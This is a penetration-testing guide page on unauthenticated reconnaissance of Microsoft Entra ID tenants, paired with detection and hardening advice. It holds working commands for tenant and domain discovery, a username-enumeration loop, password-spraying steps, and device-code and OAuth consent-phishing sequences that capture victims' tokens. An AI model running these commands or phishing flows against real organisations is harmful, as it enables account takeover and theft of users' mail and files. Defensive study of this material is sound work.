---
cstg_id: CSTG-AZURE-ENTRA-ID-UNAUTH
title: "AZURE Entra Id - Unauthenticated Access"
provider: azure
service: entra-id
phase: unauthenticated
required_access: unauthenticated
required_permissions: []
tools: [AADInternals, o365creds (MailSniper), TeamFiltration, ROADtools, oh365-user-finder, curl, dnsrecon]
references:
  - "https://learn.microsoft.com/en-us/entra/identity-platform/v2-protocols"
  - "https://learn.microsoft.com/en-us/entra/identity-platform/howto-get-tenant-id"
  - "https://aadinternals.com/post/just-looking/"
  - "https://aadinternals.com/aadinternals/"
  - "https://learn.microsoft.com/en-us/entra/identity/authentication/concept-authentication-passwordless"
  - "https://login.microsoftonline.com/common/userrealm/"
  - "https://github.com/dafthack/MailSniper"
  - "https://github.com/Flangvik/TeamFiltration"
  - "https://learn.microsoft.com/en-us/entra/identity/conditional-access/concept-conditional-access-policies"
license: CC BY-SA 4.0
---

## Summary

Microsoft Entra ID (formerly Azure Active Directory) is the identity and access management plane for Microsoft 365, the Azure resource manager, and millions of third-party applications federated through OpenID Connect / OAuth 2.0 / SAML. Because Entra ID is designed for internet-scale single sign-on, a large amount of tenant metadata is exposed to **completely unauthenticated** requesters by design. This metadata is essential for SSO bootstrapping (login pages must discover a tenant's federation settings before a user authenticates) but it also provides an external attacker with a rich reconnaissance surface that requires no credentials whatsoever.

The unauthenticated attacker objective at this phase is: confirm a target organization uses Entra ID, recover the tenant identifier (GUID), enumerate all registered domains and brand names, fingerprint the federation/authentication model (managed vs. federated, on-premises ADFS, passwordless, etc.), validate which usernames exist, and identify guest/B2B relationships and tenant capabilities — all before any login attempt. This intelligence directly informs password spraying, device-code phishing, consent phishing, and federation-trust attacks performed in later phases.

This page covers only what is reachable **with no token**. Authenticated directory enumeration is covered in [azure-entra-id-enum.md](../02-services/azure-entra-id-enum.md).

## Prerequisites

- No authentication, tokens, or tenant membership are required.
- Only outbound HTTPS access to Microsoft public endpoints (`login.microsoftonline.com`, `login.microsoft.com`, `autodiscover-s.outlook.com`, `*.onmicrosoft.com`, `graph.microsoft.com` anonymous surfaces) and public DNS resolution.
- A target organization's primary domain name (e.g. `contoso.com`) or its tenant's default `*.onmicrosoft.com` name is the only input needed to begin.

## Enumeration

### Confirm Entra ID usage and recover the tenant ID

Every Entra ID tenant publishes an unauthenticated OpenID Connect discovery document. The `issuer` and `token_endpoint` reveal the tenant GUID:

```bash
# OpenID configuration keyed by domain — returns the tenant GUID in issuer/authorization_endpoint
curl -s "https://login.microsoftonline.com/contoso.com/v2.0/.well-known/openid-configuration" | jq .

# Same, keyed by the onmicrosoft.com vanity name
curl -s "https://login.microsoftonline.com/contoso.onmicrosoft.com/v2.0/.well-known/openid-configuration" | jq -r .issuer
```

A `200` with an `issuer` of the form `https://login.microsoftonline.com/<tenant-guid>/v2.0` confirms the domain is backed by Entra ID and yields the immutable tenant ID.

### Enumerate the authentication / federation model

The `GetUserRealm` and `getcredentialtype` endpoints expose the tenant's authentication posture without credentials:

```bash
# User realm: Managed vs. Federated, NameSpaceType, federation (ADFS) URLs and brand name
curl -s "https://login.microsoftonline.com/getuserrealm.srf?login=user@contoso.com&xml=1"

# Credential-type API: reveals IfExistsResult (user validity), desktopSso, ThrottleStatus,
# Credentials.HasPassword, FederationRedirectUrl, and EstsProperties
curl -s -X POST "https://login.microsoftonline.com/common/GetCredentialType" \
  -H "Content-Type: application/json" \
  -d '{"Username":"user@contoso.com","isOtherIdpSupported":true}'
```

Key fields:
- `NameSpaceType: Federated` plus an `AuthURL` pointing at an on-premises ADFS/PingFederate host indicates the authentication boundary lives outside Microsoft (relevant to federation-trust attacks).
- `NameSpaceType: Managed` indicates Entra ID handles authentication directly (cloud password / passwordless).
- `IfExistsResult: 0` indicates the username exists in the tenant; `1`/`5`/`6` indicate it does not, is external, or is throttled.

### Enumerate registered domains for a tenant

`GetUserRealm` and the autodiscover federation information endpoint return all domains associated with the same tenant, mapping an organization's full domain footprint:

```bash
# SOAP request to autodiscover returns every verified domain attached to the tenant
curl -s -X POST "https://autodiscover-s.outlook.com/autodiscover/autodiscover.svc" \
  -H 'Content-Type: text/xml; charset=utf-8' \
  -H 'SOAPAction: "http://schemas.microsoft.com/exchange/2010/Autodiscover/Autodiscover/GetFederationInformation"' \
  --data-binary @getfederationinfo.xml
```

Tooling such as **AADInternals** wraps these calls:

```powershell
# Returns tenant brand, tenant GUID, all domains, DesktopSSO state, MX/SPF/DMARC hints, MDI/Defender presence
Invoke-AADIntReconAsOutsider -DomainName "contoso.com" | Format-Table
Get-AADIntTenantID -Domain "contoso.com"
Get-AADIntLoginInformation -Domain "contoso.com"
```

### Validate usernames (account enumeration)

The same `GetCredentialType` / `GetUserRealm` responses act as a username oracle. Tooling automates validation against a wordlist of `firstname.lastname@domain` permutations:

```bash
# o365-user-finder / oh365-user-finder style validation loop (conceptual)
for u in $(cat users.txt); do
  result=$(curl -s -X POST "https://login.microsoftonline.com/common/GetCredentialType" \
    -H "Content-Type: application/json" -d "{\"Username\":\"$u\"}" | jq -r .IfExistsResult)
  [ "$result" = "0" ] && echo "VALID: $u"
done
```

TeamFiltration, MailSniper (`Invoke-UserEnumerationOnPrem` / O365 modes), and oh365-user-finder perform this at scale.

### Tenant capabilities and guest posture

```powershell
# DesktopSSO (Seamless SSO) enabled? -> Kerberos-based silent auth surface
Get-AADIntTenantDomains -Domain "contoso.com"

# Whether the tenant allows external/guest self-service and which OAuth flows are advertised
curl -s "https://login.microsoftonline.com/<tenant-guid>/v2.0/.well-known/openid-configuration" | jq '.grant_types_supported, .scopes_supported'
```

## Misconfigurations & Findings

- **Username-enumeration oracle exposed.** `GetCredentialType` distinguishes valid from invalid accounts (`IfExistsResult`), enabling reliable account validation that feeds password spraying. This is inherent to the SSO design but is materially worse when combined with the absence of Smart Lockout tuning or Conditional Access.
- **Federated tenants leaking on-prem endpoints.** `AuthURL`/`FederationRedirectUrl` exposing `adfs.contoso.com` reveal the on-premises identity boundary, ADFS version, and a target for token-signing-certificate (Golden SAML) and password-spray attacks against the ADFS portal.
- **Seamless SSO (DesktopSSO) enabled.** Indicates the `AZUREADSSOACC$` computer object and Kerberos-based silent SSO are in use, a known target for Silver-ticket / Kerberos abuse from a foothold on the corporate network.
- **Overly permissive guest/external collaboration defaults.** Tenants left at default B2B settings allow any external user to be invited and to enumerate the directory once accepted; some allow self-service sign-up.
- **Unrestricted user consent to applications.** When users can consent to third-party apps requesting delegated permissions, a single consent-phishing lure grants an attacker app standing access to mail/files - no credential needed. Worse if the device-code flow is enabled tenant-wide.
- **Verbose tenant branding and domain sprawl.** Recon reveals brand name, all verified domains (including forgotten test/M&A domains), and stale `*.onmicrosoft.com` names that widen the spray surface.
- **No anti-automation on auth endpoints.** Lack of geo/IP throttling allows large-scale unauthenticated enumeration of users and domains.

## Exploitation

This phase is reconnaissance; it produces inputs for later authenticated attacks rather than direct compromise. The unauthenticated-to-authenticated pivot typically proceeds:

1. **Build a validated user list** from `GetCredentialType` enumeration against generated name permutations and OSINT-harvested email addresses.
2. **Fingerprint the auth model** to choose an attack: managed tenants → cloud password spraying and device-code phishing; federated tenants → spraying the ADFS portal or targeting on-prem.
3. **Low-and-slow password spraying** against validated users using a small set of seasonal/common passwords, respecting Smart Lockout thresholds (tooling: TeamFiltration `--spray`, MailSniper `Invoke-PasswordSprayOWA/Office365`). Successful credentials transition the engagement to the authenticated phases.
4. **Token-phishing** (below) seeded with the recovered tenant ID, brand name, and valid usernames - obtains tokens directly, bypassing the password and often the MFA prompt the victim themselves satisfies.

Detailed credential-abuse and token paths are continued in the authenticated phases; this page stops at the point where a valid credential or token is obtained.

### Device-code phishing

The OAuth 2.0 device-authorization flow can be abused to capture a victim's tokens without ever handling their password. The attacker initiates the flow, sends the short-lived `user_code` to the victim wrapped in a believable prompt ("sign in to view this document"), and polls for the resulting tokens while the victim authenticates - completing their own MFA in the process, so the issued tokens are fully MFA-satisfied.

```bash
T=<tenant-id>; CLIENT=<a-first-party-or-registered-client-id>
# 1. Request a device code (attacker side)
curl -s -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/devicecode" \
  -d "client_id=$CLIENT&scope=https://graph.microsoft.com/.default offline_access" | jq
# -> returns user_code, device_code, verification_uri (https://microsoft.com/devicelogin)
# 2. Deliver user_code + verification_uri to the victim (the phishing lure)
# 3. Poll for tokens until the victim completes sign-in (attacker side)
curl -s -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" \
  -d "grant_type=urn:ietf:params:oauth:grant-type:device_code&client_id=$CLIENT&device_code=<device_code>" | jq
# -> access_token + refresh_token for the victim, scoped as requested
```

The returned `refresh_token` provides durable access; `offline_access` makes it long-lived.

### Illicit consent grant (OAuth consent phishing)

Rather than steal a credential, trick the victim into **granting an attacker-controlled application** delegated permissions to their data. The victim is sent a legitimate Microsoft consent URL for a registered (often multi-tenant) app requesting scopes such as `Mail.Read`, `Files.Read.All`, `offline_access`; on consent, Entra issues the app tokens to the victim's data - no password, no credential theft, and MFA is irrelevant because the victim authenticated normally.

```text
https://login.microsoftonline.com/common/oauth2/v2.0/authorize?
  client_id=<attacker-app-id>&response_type=code&redirect_uri=<attacker-callback>
  &scope=offline_access%20Mail.Read%20Files.Read.All&state=cstg
```

If a tenant admin consents, the grant applies **tenant-wide** (every user's data in scope). Because the access lives in an OAuth grant rather than a credential, it survives the victim's password reset - making this both an initial-access and a persistence technique.

## Detection & Logging

- Unauthenticated `GetUserRealm`/`GetCredentialType`/autodiscover calls are largely **invisible to the tenant** — they do not generate Entra ID sign-in logs because no authentication occurs. This is a fundamental detection blind spot at this phase.
- The first observable signal is in **Entra ID sign-in logs** once enumeration transitions to authentication attempts: high volumes of failures with error codes `50126` (invalid credential), `50053` (account locked / Smart Lockout), `50034` (user not found), or `50055`/`50057` (expired/disabled) across many distinct usernames from few IPs indicate spraying.
- Device-code phishing appears in sign-in logs as authentications with `authenticationProtocol = deviceCode` and a mismatch between the sign-in geography and the user's normal location.
- **Microsoft Entra ID Protection** risk detections (`unfamiliarFeatures`, `anonymousIPAddress`, `passwordSpray`) surface the authenticated tail of this activity.
- **Microsoft Defender for Identity** can flag reconnaissance and Seamless SSO abuse on the on-premises side.
- Azure Activity Logs are not relevant here as no ARM control-plane actions occur.

## Remediation & Hardening

- Enable and tune **Smart Lockout** and configure a strong banned-password list to blunt spraying derived from enumeration.
- Deploy **Conditional Access** to require MFA for all users and block legacy/basic authentication protocols, which are the primary spray targets.
- **Disable the device-code flow** via Conditional Access authentication-flow policies except where operationally required.
- **Restrict user consent** (Entra ID > Enterprise applications > Consent and permissions) to apps from verified publishers requesting low-impact scopes, and enable the **admin consent workflow**; periodically review existing OAuth grants/enterprise apps for risky or over-permissioned consents (`Get-MgOauth2PermissionGrant`).
- Restrict **guest/external collaboration** to the minimum (Entra ID > External Identities > Collaboration restrictions) and disable self-service sign-up.
- Retire **unused/forgotten domains** and stale `*.onmicrosoft.com` references; minimise tenant branding that aids social engineering.
- Where ADFS is used, restrict the federation portal exposure, patch to current versions, and prefer migration to managed authentication (PHS/PTA + Conditional Access) to remove the on-prem attack surface.
- Deploy **Entra ID Protection** with sign-in and user risk policies, and monitor for spray/anomalous-location signals.
- Username enumeration via `GetCredentialType` cannot be fully disabled (it is required for SSO), so compensate with the controls above and with monitoring for distributed validation traffic at the network/CDN edge.

## Tools

- **AADInternals** — `Invoke-AADIntReconAsOutsider`, `Get-AADIntTenantID`, `Get-AADIntLoginInformation` for unauthenticated tenant recon.
- **TeamFiltration** — cross-platform outsider enumeration, spraying, and exfiltration.
- **MailSniper** — O365/OWA user enumeration and password spraying.
- **oh365-user-finder / o365creds** — bulk username validation via `GetCredentialType`.
- **ROADtools (roadrecon)** — primarily authenticated, but `roadtx` assists device-code and federation flows seeded from recon.
- **curl / standard HTTP clients** — direct calls to discovery, realm, and credential-type endpoints.
- **dnsrecon / public DNS tooling** — MX/SPF/DMARC/autodiscover record correlation to confirm M365 usage.

## References

- Microsoft Learn — OAuth 2.0 / OpenID Connect protocols on the Microsoft identity platform
- Microsoft Learn — How to find your Microsoft Entra tenant ID
- Microsoft Learn — Conditional Access policies overview
- Microsoft Learn — Passwordless authentication concepts
- AADInternals — "Just looking" (outsider reconnaissance) and module documentation
- MailSniper (dafthack) and TeamFiltration (Flangvik) project documentation
- `login.microsoftonline.com/common/userrealm` and `GetCredentialType` endpoint behaviour
